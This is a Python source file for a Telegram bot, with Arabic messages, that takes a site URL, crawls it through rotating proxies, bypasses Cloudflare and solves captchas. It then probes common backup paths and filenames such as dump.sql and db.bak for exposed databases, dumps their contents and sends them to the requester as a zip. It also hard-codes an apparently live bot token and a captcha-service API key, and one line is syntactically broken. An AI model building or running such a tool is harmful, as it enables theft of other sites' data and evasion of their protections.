
import os
import shutil
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from telegram import Update, InputFile
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
import zipfile
import re
import sqlite3
import pymysql
import pymongo
import cloudscraper
from PIL import Image
from io import BytesIO
from captcha_solver import CaptchaSolver
import random
import json

# التوكن والبروكسي والمفتاح
TELEGRAM_BOT_TOKEN = "7307815481:AAHluueQ88wzRyGMSMFXhnJOLwHICfljFNs"
PROXY_LIST = [
    "http://185.199.229.156:7492",
    "http://185.199.228.220:7300",
    "http://185.199.231.45:8382"
]
CAPTCHA_SOLVER_API_KEY = "4c7153ae3d97525c45d3f9f281627fb8"

def get_proxy():
    return random.choice(PROXY_LIST)

def download_file(session, url, folder, proxy=None):
    try:
        response = session.get(url, allow_redirects=True, proxies={"http": proxy, "https": proxy}, timeout=5)
        response.raise_for_status()

        content_type = response.headers.get('content-type', '').lower()
        if 'text' in content_type:
            content = response.text
        else:
            content = response.content

        parsed_url = urlparse(url)
        path = parsed_url.path
        if path.endswith('/'):
            path += 'index.html'
        filename = os.path.basename(path)
        if not filename:
            filename = 'index.html'
        relative_path = os.path.relpath(path, '/')
        filepath = os.path.join(folder, relative_path)

        os.makedirs(os.path.dirname(filepath), exist_ok=True)

        if 'text' in content_type:
            with open(filepath, 'w', encoding='utf-8') as file:
                file.write(content)
        else:
            with open(filepath, 'wb') as file:
                file.write(content)

        print(f'Successfully downloaded {url} to {filepath}')
        return filepath
    except requests.RequestException as e:
        print(f'Failed to download {url}. Error: {e}')
        return None
    except OSError as e:
        print(f'OS error: {e}')
        return None

def is_database_file(url, content):
    db_extensions = ['.sql', '.db', '.sqlite', '.mdb', '.accdb', '.csv', '.json', '.xml', '.dmp', '.bak', '.tar', '.gz', '.7z', '.zip']
    db_keywords = ['database', 'table', 'insert into', 'create table', 'select from', 'mysql', 'mongo', 'sqlite']

    if any(url.lower().endswith(ext) for ext in db_extensions):
        return True

    if isinstance(content, str):
        lower_content = content.lower()
        if any(keyword in lower_content for keyword in db_keywords):
            return True

    return False

def extract_database_from_archive(filepath):
    if filepath.endswith('.zip'):
        with zipfile.ZipFile(filepath, 'r') as zip_ref:
            zip_ref.extractall(os.path.dirname(filepath))
        return [os.path.join(os.path.dirname(filepath), f) for f in os.listdir(os.path.dirname(filepath)) if is_database_file(f, '')]
    elif filepath.endswith('.tar') or filepath.endswith('.tar.gz') or filepath.endswith('.tgz'):
        import tarfile
        with tarfile.open(filepath, 'r:gz') as tar_ref:
            tar_ref.extractall(path=os.path.dirname(filepath))
        return [os.path.join(os.path.dirname(filepath), f) for f in os.listdir(os.path.dirname(filepath)) if is_database_file(f, '')]
    elif filepath.endswith('.7z'):
        import py7zr
        with py7zr.SevenZipFile(filepath, mode='r') as z:
            z.extractall(path=os.path.dirname(filepath))
        return [os.path.join(os.path.dirname(filepath), f) for f in os.listdir(os.path.dirname(filepath)) if is_database_file(f, '')]
    else:
        return [filepath]

def connect_and_dump_database(filepath):
    if filepath.endswith('.sql'):
        return filepath  # SQL dump files can be directly sent as is

    conn = None
    cursor = None
    try:
        if filepath.endswith('.db') or filepath.endswith('.sqlite'):
            conn = sqlite3.connect(filepath)
            cursor = conn.cursor()
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = cursor.fetchall()
            for table in tables:
                table_name = table[0]
                cursor.execute(f"SELECT * FROM {table_name};")
                rows = cursor.fetchall()
                for row in rows:
                    print(row)
        elif filepath.endswith('.dmp') or filepath.endswith('.bak'):
            # Assuming these are MySQL dump files
            conn = pymysql.connect(host='localhost', user='root', password='', db='', charset='utf8mb4', cursorclass=pymysql.cursors.DictCursor)
            cursor = conn.cursor()
            with open(filepath, 'r') as f:
                cursor.execute(f.read())
            conn.commit()
        elif filepath.endswith('.json'):
            with open(filepath, 'r') as f:
                data = json.load(f)
            if isinstance(data, dict) and 'collections' in 
                # Assuming this is a MongoDB dump file
                client = pymongo.MongoClient('mongodb://localhost:27017/')
                db = client['test']
                for collection_name, collection_data in data['collections'].items():
                    collection = db[collection_name]
                    collection.insert_many(collection_data)
        else:
            print(f"Unsupported database file type: {filepath}")

        return filepath
    except Exception as e:
        print(f"Error connecting and dumping database: {e}")
        return None
    finally:
        if cursor:
            cursor.close()
        if conn:
            conn.close()

def bypass_cloudflare(session, url):
    scraper = cloudscraper.create_scraper(delay=10, browser="chrome")
    response = scraper.get(url)
    if "You are being rate limited" in response.text:
        print("Cloudflare protection detected. Bypassing...")
        return session.get(url, allow_redirects=True, proxies={"http": get_proxy(), "https": get_proxy()}, timeout=5)
    else:
        return response

def solve_captcha(session, url):
    response = session.get(url)
    if "captcha" in response.text.lower():
        print("Captcha detected. Solving...")
        captcha_image_url = urljoin(url, re.search(r'src="([^"]+)"', response.text).group(1))
        captcha_image = Image.open(BytesIO(session.get(captcha_image_url).content))
        captcha_solver = CaptchaSolver(CAPTCHA_SOLVER_API_KEY)
        captcha_text = captcha_solver.solve(captcha_image)
        print(f"Captcha solved: {captcha_text}")
        return captcha_text
    else:
        return None

def scrape_website(base_url, folder):
    session = requests.Session()
    visited_urls = set()
    to_visit_urls = {base_url}

    database_files = []

    while to_visit_urls:
        current_url = to_visit_urls.pop()
        if current_url in visited_urls:
            continue

        try:
            response = bypass_cloudflare(session, current_url)
            if response.status_code == 200:
                captcha_text = solve_captcha(session, current_url)
                if captcha_text:
                    response = session.post(current_url, data={"captcha": captcha_text}, allow_redirects=True)
                response.raise_for_status()
            else:
                print(f"Failed to access {current_url}. Status code: {response.status_code}")
                continue
        except requests.RequestException as e:
            print(f'Failed to access {current_url}. Error: {e}')
            continue

        visited_urls.add(current_url)

        content_type = response.headers.get('content-type', '').lower()
        if 'text' in content_type:
            content = response.text
        else:
            content = response.content

        if is_database_file(current_url, content):
            filepath = download_file(session, current_url, folder)
            if filepath:
                database_files.append(filepath)

        soup = BeautifulSoup(content, 'html.parser')
        tags = soup.find_all(['a'])

        for tag in tags:
            file_url = None
            if tag.name == 'a' and 'href' in tag.attrs:
                file_url = tag['href']

            if file_url:
                full_url = urljoin(current_url, file_url)
                if is_database_file(full_url, ''):
                    filepath = download_file(session, full_url, folder, proxy=get_proxy())
                    if filepath:
                        database_files.append(filepath)

        # Check for database files in common locations
        common_locations = ['/db/', '/database/', '/data/', '/backup/']
        for location in common_locations:
            db_url = urljoin(current_url, location)
            if urlparse(db_url).netloc == urlparse(current_url).netloc:
                to_visit_urls.add(db_url)

    # Attempt to download databases from common file names
    common_files = ['database.sql', 'backup.sql', 'dump.sql', 'data.db', 'site.db', 'db.json', 'db.dmp', 'db.bak']
    for filename in common_files:
        db_url = urljoin(base_url, filename)
        if urlparse(db_url).netloc == urlparse(base_url).netloc:
            filepath = download_file(session, db_url, folder, proxy=get_proxy())
            if filepath:
                database_files.append(filepath)

    return database_files

def zip_files(files, folder):
    zip_filename = f'{folder}.zip'
    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        for file in files:
            zipf.write(file, os.path.relpath(file, folder))
    return zip_filename

def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('أرسل لي رابط الموقع الذي ترغب في تحميل قواعد البيانات الخاصة به.')

def handle_message(update: Update, context: CallbackContext) -> None:
    url = update.message.text
    folder = 'downloaded_databases'

    if os.path.exists(folder):
        shutil.rmtree(folder)
    os.makedirs(folder, exist_ok=True)

    try:
        update.message.reply_text('جاري تحميل قواعد البيانات...')
        database_files = scrape_website(url, folder)
        if database_files:
            update.message.reply_text(f'تم العثور على {len(database_files)} ملف(ات) لقواعد البيانات:')
            extracted_files = []
            for db_file in database_files:
                extracted_files.extend(extract_database_from_archive(db_file))
            database_files = extracted_files  # Update the list with extracted files
            for db_file in database_files:
                update.message.reply_text(f'- {os.path.basename(db_file)}')

            dumped_files = []
            for db_file in database_files:
                dumped_file = connect_and_dump_database(db_file)
                if dumped_file:
                    dumped_files.append(dumped_file)
            database_files = dumped_files  # Update the list with dumped files

            update.message.reply_text('يتم الآن ضغط الملفات...')
            zip_filename = zip_files(database_files, folder)
            with open(zip_filename, 'rb') as f:
                context.bot.send_document(chat_id=update.message.chat_id, document=InputFile(f, zip_filename))
            update.message.reply_text('تم إرسال الملفات المضغوطة بنجاح.')
        else:
            update.message.reply_text('لم يتم العثور على قواعد بيانات لتحميلها.')
    except Exception as e:
        update.message.reply_text(f'حدث خطأ أثناء تحميل قواعد البيانات: {e}')

def main():
    updater = Updater(TELEGRAM_BOT_TOKEN, use_context=True)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
   
